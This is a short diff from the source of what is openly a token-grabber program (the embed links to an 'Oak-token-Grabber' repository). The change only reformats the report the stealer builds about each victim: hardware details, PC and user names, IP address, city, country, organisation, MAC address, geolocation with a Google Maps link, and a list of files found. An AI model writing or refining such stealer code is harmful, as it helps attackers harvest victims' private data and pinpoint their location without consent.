@@ -371,31 +371,7 @@ Processes running
                              "url": "https://github.com/j0taro/Oak-token-Grabber",
                              "icon_url": "https://i.imgur.com/bbWgtHI.png"
                          },
-                         "description": f"""{embedMsg}
-                         **__PC INFO__**
-                         **RAM:** `{ramg}`
-                         **Disk:** `{disk}GB`
-                         **CPU:** `{cpu}`
-                         **GPU:** `{gpu}`
-                         **Refresh rate:** `{rr}`
-                         **Model name:** `{mn}`
-                         **Build manufacturer:** `{bm}`
-                         **Resolution:** `{size}`
-                         **Platform:** `{platform}`
-                         **PC-Name:** `{Oakname}`
-                         **PC-User:** `{pc_username}`
-                         **__IP INFO__**
-                         **IP:** `{ip}`
-                         **City:** `{city}`
-                         **Country:** `{country}`
-                         **Region:** `{region}`
-                         **Org:** `{org}`
-                         **Mac:** `{mac}`
-                         **Loc:** `{loc}`
-                         **Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})
-                         **Elapsed time:** `{time.time() - starttime}`
-                         ```yaml
-{fc} Files Found:\n{f}{f2}```""",
+                         "description": f"""{embedMsg}\n**__PC INFO__**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:** `{cpu}`\n**GPU:** `{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
                          "color": 0x1e8a81,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "thumbnail": {
